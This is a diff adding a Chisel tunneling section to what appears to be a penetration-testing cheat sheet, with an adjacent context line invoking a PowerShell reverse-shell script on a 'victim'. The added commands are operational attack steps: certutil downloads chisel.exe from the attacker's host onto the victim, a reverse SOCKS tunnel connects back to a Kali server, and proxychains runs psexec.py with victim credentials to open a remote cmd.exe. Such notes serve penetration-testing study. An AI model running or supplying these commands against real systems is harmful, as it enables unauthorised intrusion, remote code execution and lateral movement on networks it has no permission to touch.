@@ -580,6 +580,34 @@ powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victi
 ````
 ## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
 ### Tools
+#### Chisel
+##### Chisel Windows
+````
+https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_windows_amd64.gz #Windows Client
+cp /home/kali/Downloads/chisel_1.7.3_windows_amd64.gz .
+gunzip -d *.gz
+chmod +x chisel_1.7.3_windows_amd64
+mv chisel_1.7.3_windows_amd64 chisel.exe
+````
+##### Chisel Nix
+````
+locate chisel
+/usr/bin/chisel #Linux Server
+````
+###### Windows to Nix
+````
+chisel server --reverse -p 1234 #On your kali machine
+vim /etc/proxychains.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+#socks4         127.0.0.1 8080
+socks5 127.0.0.1 1080
+certutil -urlcache -split -f http://<your $IP>:<Your Porty>/chisel.exe
+.\chisel.exe client <your kali $IP>:1234 R:socks #On victim machine
+proxychains psexec.py victim:password@<victim $IP> cmd.exe
+````
 
 ## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />
 
